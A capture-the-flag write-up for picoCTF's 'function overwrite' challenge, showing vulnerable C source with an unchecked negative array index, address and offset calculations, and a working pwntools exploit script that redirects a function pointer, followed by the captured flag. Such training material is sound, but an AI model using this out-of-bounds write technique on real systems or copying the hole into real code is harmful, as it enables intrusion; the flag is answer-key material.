# funcion overwrite : Binary Exploitation

Story telling class 2/2  
You can point to all kinds of things in C. Checkout our function pointers demo [program](vuln). You can view source [here](vuln.c). And connect with it using `nc saturn.picoctf.net 50495`

Tags : Array_bounds, Function_pointers  
Author : Neel Bhavsar

# Solution

For now, try executing it.
```
$ nc saturn.picoctf.net 50495
Tell me a story and then I'll tell you if you're a 1337 >> aaaaaaaaaaaaaaaaaaaaa
On a totally unrelated note, give me two numbers. Keep the first one less than 10.
1
1
You've failed this class.
```
Check the source code.
```c vuln.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

int calculate_story_score(char *story, size_t len)
{
  int score = 0;
  for (size_t i = 0; i < len; i++)
  {
    score += story[i];
  }

  return score;
}

void easy_checker(char *story, size_t len)
{
  if (calculate_story_score(story, len) == 1337)
  {
    char buf[FLAGSIZE] = {0};
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL)
    {
      printf("%s %s", "Please create 'flag.txt' in this directory with your",
                      "own debugging flag.\n");
      exit(0);
    }

    fgets(buf, FLAGSIZE, f); // size bound read
    printf("You're 1337. Here's the flag.\n");
    printf("%s\n", buf);
  }
  else
  {
    printf("You've failed this class.");
  }
}

void hard_checker(char *story, size_t len)
{
  if (calculate_story_score(story, len) == 13371337)
  {
    char buf[FLAGSIZE] = {0};
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL)
    {
      printf("%s %s", "Please create 'flag.txt' in this directory with your",
                      "own debugging flag.\n");
      exit(0);
    }

    fgets(buf, FLAGSIZE, f); // size bound read
    printf("You're 13371337. Here's the flag.\n");
    printf("%s\n", buf);
  }
  else
  {
    printf("You've failed this class.");
  }
}

void (*check)(char*, size_t) = hard_checker;
int fun[10] = {0};

void vuln()
{
  char story[128];
  int num1, num2;

  printf("Tell me a story and then I'll tell you if you're a 1337 >> ");
  scanf("%127s", story);
  printf("On a totally unrelated note, give me two numbers. Keep the first one less than 10.\n");
  scanf("%d %d", &num1, &num2);

  if (num1 < 10)
  {
    fun[num1] += num2;
  }

  check(story, strlen(story));
}
 
int main(int argc, char **argv)
{

  setvbuf(stdout, NULL, _IONBF, 0);

  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  return 0;
}
```
The following is explanation of sorce code.
* `void (*check)(char*, size_t) = hard_checker;`:  
A function pointer `check` is declared and initialized to point to the `hard_checker` function.  
Subsequent calls to `check()` will invoke `hard_checker()` by default.
* `hard_checker()`:  
Internally calls `calculate_story_score(story, len)`, and if the returned value equals `13371337`, the flag is printed.
* `calculate_story_score(char* story, size_t len)`:  
Iterates `len` times, and in each iteration, adds the value at the index corresponding to the current iteration count in the `story` array to a `score` variable.  
After all iterations, the function returns the final computed `score`.
* `vuln()`:  
Reads up to 127 bytes of input into `story`, followed by two integers stored in `num1` and `num2`.  
If num1 is less than 10, it adds `num2` to the `fun[num1]`.  
Finally, the function calls `check(story, strlen(story))`, which effectively invokes `hard_checker()`.

By using `fun[num1] += num2;`, it's possible to overwrite the check function pointer from `hard_checker()` to `easy_checker()`.  
As a result, the required return value from `calculate_story_score()` is reduced to `1337`, making it significantly easier to satisfy the condition and retrieve the flag.

Check the security mechanism.
```
$ checksec vuln
[*] '/home/colza-picoctf/vuln'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
Caluculate the offset from the `fun` array to the `chek` function pointer.
```
$ readelf -a vuln
...
55: 0804c080    40 OBJECT  GLOBAL DEFAULT   26 fun
...
78: 0804c040     4 OBJECT  GLOBAL DEFAULT   25 check
...
```
It is determined that there is a difference of 0x40 bytes between them.  
Since each element of the `fun` array is 32 bits(4 bytes), the offset from `fun[]` to the `check` function pointer corresponds to element `-16`.

The address of `hard_checker()` is stored in `fun[-16]`, and by adding an appropriate value to it via `num2`, we aim to change it to the address of `easy_checker()`.  
Determine the offset from `hard_checker()` to `easy_checker()`.
```
$ readelf -a vuln
...
46: 08049436   314 FUNC    GLOBAL DEFAULT   15 hard_checker
...
77: 080492fc   314 FUNC    GLOBAL DEFAULT   15 easy_checker
...
```
The offset is caluculated as `0x08049436 - 0x080492fc = -13a(-314 bytes)`.

The total sum of `story` must be `1337`, which can be achieved using ten `~` characters and one `M` character.

Execution code below:
```python solve.py
from pwn import *

p = remote('saturn.picoctf.net', 50495)

payload_story = b"~" * 10 + b"M"
payload_num = b"-16 -314"

p.sendlineafter(b">> ", payload_story)
p.sendlineafter(b"than 10.\n", payload_num)

p.interactive()
```
Execute it.
```
$ python solve.py
[+] Opening connection to saturn.picoctf.net on port 50495: Done
[*] Switching to interactive mode
You're 1337. Here's the flag.
picoCTF{0v3rwrit1ng_P01nt3rs_55516c93}
[*] Got EOF while reading in interactive
```

Get the flag!

`picoCTF{0v3rwrit1ng_P01nt3rs_55516c93}`
